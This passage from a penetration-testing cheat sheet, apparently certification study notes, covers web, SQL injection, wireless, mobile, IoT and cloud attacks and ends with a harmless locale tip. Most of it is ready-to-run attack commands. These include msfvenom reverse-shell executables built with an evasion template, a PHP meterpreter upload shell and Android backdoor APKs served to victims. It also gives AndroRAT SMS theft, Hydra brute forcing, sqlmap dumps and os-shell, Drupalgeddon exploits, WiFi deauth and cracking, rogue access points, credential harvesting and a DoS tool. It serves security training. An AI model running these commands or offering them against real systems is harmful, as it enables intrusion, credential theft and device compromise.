msfvenom -p windows/shell_reverse_tcp lhost=IP lport=port -x /usr/share/metasploit-framework/data/templates/src/pe/exe/evasion.exe -f exe > /home/attacker/bypass.exe
```


-----

# Module 13: Hacking Web Servers
## Information Gathering

-  Ghost Eye
```bash
    python3 ghost_eye.py
```


## Web Server Reconnaissance

- Skipfish
```bash
skipfish -o output -S /usr/share/skipfish/dictionaries/complete.wl http:IP:port
```


## Footprint a Web Server

- whatweb
```bash
whatweb atendata.net
```

- Netcat
```bash
nc -vv www.domain.com port
```

- httprecon (Windows)

- IDServe (Windows)



## Enumerate Web Server InformationFootprint a Web Server

>  Nmap
```bash
nmap -p 80,443 -T5 <ip>
--script http-enum
--script http-trace -d domain
--script http-waf-detect
```


## Fingerprint Web Server

- uniscan: fuzzing directories and more
```bash
uniscan -u domain -q
uniscan -u domain -we
```
- Dynamic testing:
```bash
uniscan -u domain -d
```


## Crack FTP Credentials

>  Dictionary Attack with Hydra:
- `hydra -L /wordlists/usernames.txt -P /wordlists/pass.txt service://IP`
- `hydra -L pathFile-usernames –P pathFile-passwords IP -s port service`
- `hydra -l username –P pathFile-passwords IP -s port service`
- `hydra -L pathFile-usernames –p password IP -s port service`
Example: `hydra -L /home/usernames.txt -P /home/pass.txt ftp://IP`


## Brute force to login

>  Hydra
- `hydra -l <username> -P </passwords_list.txt> target http-post-form "/login-page.php:fieldUsername=username&fieldPassword=^PASS^:text"``
- Example:
	* `hydra -l admin -P ./rockyou.txt IP http-post-form "/monitoring/login.php:username=admin&password=^PASS^:Invalid Credentials!"`


## Brute force to popup

> Hydra
- `hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt IP -s 30705 http-get /`


## Wordpress

> Pentest Wordpress
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress

> Interesting paths
* /wp-login.php
* /wp-login
* /wp-admin
* /wp-admin.php
* /login
* /wp-config.php
* /wp-content/uploads/
* /uploads
* /wp-includes/
* /admin
* /wp-admin/login.php
* /wp-admin/wp-login.php
* /login.php

- Wpscan
```bash
wpscan --url http://IP --password wordlistPass --usernames wordlistUsers
```
## Drupal

- droopescan: `droopescan scan drupal -u <http://example.org/> -t theads`

- drupwn: `python3 drupwn --mode enum --target <https://example.com>`, `python3 drupwn --mode exploit --target https://example.com`

### Exploits
- Drupalgeddon: https://www.exploit-db.com/exploits/34992
```bash
python2.7 drupalgeddon.py -t http://domain.local -u <user> -p <password>

or
[msf]> exploit/multi/http/drupal_drupageddon
or
[msf]> exploit/unix/webapp/drupal_drupalgeddon2
```

- Drupalgeddon2: https://www.exploit-db.com/exploits/44448
- Drupalgeddon3: https://github.com/rithchard/Drupalgeddon3 or Metasploit with multi/http/drupal_drupageddon3



----

# Module 14: Hacking Web Applications
## Web Application Reconnaissance

>   whatweb
- `whatweb domain`



## Web Spidering
> Owasp ZAP
- zaproxy

##  Detect Load Balancers (distribute web server load over multiple servers)

- dig
```bash
dig domain
If the domain has different IPs associated with it, it has a balancer.
```

- lbd (load balancing detector)
```bash
lbd domain
```

##  Identify Web Server Directories (domains and subdomains) -> view module 1

- gobuster
```bash
gobuster dir -u domain -w dictionary.txt
```

- ferox
```bash
feroxbuster -u http://atendata.net
```


##  Web Application Vulnerability Scanning

- nuclei

-  Vega (sqli, xss, disclosed sensitive information, and more): Windows
    - Scan > Start new scan > Select a scan target > Select modules

- wpscan (for wordpress)
```bash
wpscan --api-token token --url domain --plugins-detection aggressive --enumerate vp
```

- N-Stalker Web Application Security Scanner (Windows)
    - click the update button > update > click start > enter the web application url > choose scan policy (OWASP) > start session > start scan


## Identify Clickjacking Vulnerability
- ClickjackPoc
```bash
echo "domain" | tee domain.txt
python3 clickJackPoc.py -f domain.txt
```


##  Identifying XSS Vulnerabilities

- PwnXSS
```bash
python3 pwnxss.py -u domain
```

## File Upload Vulnerability

- msfvenom
```bash
msfvenom -p php/meterpreter/reverse_tcp lhost=IP lport=port -f raw > upload.php
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
```


##   Create a web shell
- weevely
----

# Module 15: SQLi (SQL Injection)
##   SQLi Attack 
- sqlamp
```bash
sqlmap -u "domain/page.php?parameter=1" --dbs
sqlmap -u "domain/page.php?parameter=1" -D database --tables
sqlmap -u "domain/page.php?parameter=1" -D database -T table --dump
sqlmap -u "domain/page.php?parameter=1" -D database -T table --os-shell
sqlmap -u "domain/page.php?parameter=1" --cookie="cookie" --dbs
sqlmap -u "domain/page.php?parameter=1" --crawl=3 --dbs
sqlmap -u "domain/page.php?parameter=1" --dbs --level=5 --risk=3
```

- DSSS
```bash
https://github.com/stamparm/DSSS
inspect element
console>> document.cookie
python3 dsss.py -u "domain/page.php?parameter=1" --cookie="cookie"
```
----


# Module 16: Hacking Wireless Networks
## Find WiFi Networks in Range 
- NetSurveyor (Windows)

## Find WiFi Networks and Sniff WiFi Packets

- airmon
```bash
ifconfig
airmon-ng start interface
airmon-ng check kill
airmon-ng start wlan0mon
```
	
- Wash
    - Find WiFi Networks (access points - AP) - To detect WPS-enabled devices: `wash -i interface`

## Crack a WEP Network
- aircrack-ng

- Puts the wireless interface into monitor mode: `airmon-ng start wlan0mon`
- List a detected access points and connected clients (stations):  `airodump-ng wlan0mon`
- List of connected clients (stations): `airodump-ng --bssid MACAddress wlan0mon`
- Generate de-authentication packets: `aireplay-ng -0 11 -a MAC-AP -c MAC-dest wlan0mon`

- Crack a PCAP file
```bash
aircrack-ng file.pcap
aircrack-ng -w /usr/share/seclist/[...] file.pcap
```

- Wifiphisher
```bash
cd wifiphisher
wifiphisher --force-hostapd
network manage connect
```

- Airodump
```bash
airodump-ng {file}.cap
airodump-ng wlan0mon --encrypt wep
airodump-ng --dssid SSID -c channel -w Wepcrack wlan0mon
aireplay-ng -0 11 -a MAC-AP -c MAC-dest wlan0mon
aircrack-ng file.cap
aircrack-ng -w /usr/share/seclist/[...] file.cap
aircrack-ng -a2 Handshake -w /usr/share/seclist/[...]
```

## Crack a WPA Network
- Fern Wifi Cracker
```bash
fern-wifi-cracker > scan for access points > WPA > Select one > Browse > Select wordlist > Click wifi attack
```


## Create a Rogue Access Point
-  Create_ap
```bash
    cd create_ap
    create_ap wirelessInterface interfaceInternet nameRogue
    sudo bettercap -X -I wirelessInterface -S NONE --proxy --no-discovery
```

----

# Module 17: Hacking Mobile Platforms
##   Hack an Android Device by Creating Binary Payloads (create malicious APK)

-  msfvenom
```bash
msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik lhost=IP R > ./backdoor.apk
cp /root/Desktop/backdoor.apk /var/www/html/share
service postgresql start
use exploit/multi/handler
```
On Android:
	- http://IP/share/ >  download the backdoor.apk > execute it

- AndroRAT
```bash
cd androRAT
pyhton3 androRAT.py --build -i IPattacker -p port -o update.apk
cp /home/attacker/AndroRAT/update.apk /var/www/html/share
service apache2 start

# waiting for connections:
python3 androRAT.py --shell -i 0.0.0.0 -p port

# transfer it to Android machine and execute it
deviceInfo
getSMS inbox
getMACAddress
```

##   Harvester Users' Credentials using the Social-Engineer Toolkit (SET)
- SET
```bash
setoolkit > social-engineering attacks > website attack vectors > credential harvester attack method > site cloner
```


##   Launch a DoS Attack on a Target Machine

-  Low Orbit Ion Cannon (LOIC) - apk
```bash
click the apk and install it > choose the IP target > get ip > tcp and port 80, threads 100 > start
```


##   Exploit Android Platform though ADB
- phonesploit
```bash
cd PhoneSploit
python3 phonesploit.py
# connect a new phone
# enter a IP address
```

##   Analyze a malicious app
https://www.sisik.eu/apk-tool
https://virustotal.com


##   Secure Android Devices from Malicious Apps
- Malwarebytes Security -> antimalware available on Google Play

## Connect to Android device with adb
>  Search Linux system on the network.
* Port 5555 freeciv or adb (Android Debug Bridge).

> List devices: `adb devices`

> Connect with
```bash
adb connect IP
adb connect IP:PORT
adb -s 127.0.0.1:5555 shell
```

> Escalate privileges
- `adb root`

> Get a shell
- `adb shell`

> Find secret file
- `find /sdcard/ -name "secret.txt" -o -name "another_secret.txt"`

> Download a file
- `adb pull /sdcard/demo.mp4 ./`

> Upload a file
- `adb push test.apk /sdcard`

----
# Module 18: IoT and OT Hacking
##   Gather Information
* Shodan
	- port:1883
	- geolocation:SCADA Country:"US"


##   Sniffing Traffic
>  Wireshark
- mqtt (Protocol Standard for IoT Messaging - msgtype)
- bevywise IoT simulator - Windows 
- runsimulator.bat


----

# Module 19: Cloud Computing
##   Enumerate S3 Buckets

- lazys3
```bash
ruby lazys3.rb companyName
```

- S3Scanner
```bash
python3 ./s3scanner.py sites.txt
```
- Dump all open buckets and log both open and closed buckets:
```bash
python3 ./s3scanner.py --include-closed --out-file sites.txt --dump names.txt
```

##   Exploit Open S3 Buckets
>  AWS CLI
```bash
aws configure
aws s3 ls s3://bucketName
https://bucketname.s3.amazonaws.com
```


----

# Module 20: Cryptography
## Calculate One-way hashes
- HashCalc (Windows)

## Calculate MD5 Hashes
- MD5 calculator (Windows) - It can be useful for compare the MD5 values too
- HashMyFiles (Windows)


## Perform File and Text Message Encryption
-  CryptoForge (Windows) - File and text encryption/decryption software
    - It can encrypt and decrypt files.
    - right mouse button > encrypt > choose a passphrase

- Advanced Encryption Package (Windows): aep.msi
    - It can encrypt and decrypt files.

## Encrypt and Decrypt Data
- BCTextEncoder (Windows)
- Hash decrypt
    - https://hashes.com/en/decrypt/hash
    - https://crackstation.net/


## Create and Use Self-signed Certificates

-  Internet Information Services (IIS) Manager: Windows
```bash
- server certificates > create self-signed certificates > bindings > add site binding > add the hostname, IP and port > refresh and access to the domain
```


## Email Encryption
* RMail


## Disk Encryption
-  VeraCrypt (Windows)

- BitLocker (Windows)
    - turn the bitlocker off > use a password to unlock the drive > enter the password

- Rohos Disk Encryption (Windows)
-    Disconnect > enter the password > browse


## Cryptanalysis
-  CrypTool (Windows) - Decrypt files
```bash
File > new
Encrypt/Decrypt
Symmetric (modern)
RC2, Triple DES...
```

- AlphaPeeler (Windows)
```bash
    proffesional crypto
    DES crypto
    enter the pass phrase and select the file
```

## Parrot OS utils
To change the terminal locale in Parrot OS to Spanish, you can follow these steps:

1. Open the terminal.
2. Edit the locale configuration file with the following command:
   ```bash
   sudo nano /etc/default/locale
   ```
3. Change or add the following lines to set the locale to Spanish:
   ```
   LANG="es_ES.UTF-8"
   LANGUAGE="es_ES:es"
   LC_ALL="es_ES.UTF-8"
   ```
4. Save and close the file (in nano, you can do this by pressing `CTRL+O`, then `ENTER` to save and `CTRL+X` to exit).
5. Generate the Spanish locale if it is not available:
   ```bash
   sudo locale-gen es_ES.UTF-8
   ```
6. Apply the changes by restarting the terminal or running:
   ```bash
   source /etc/default/locale
   ```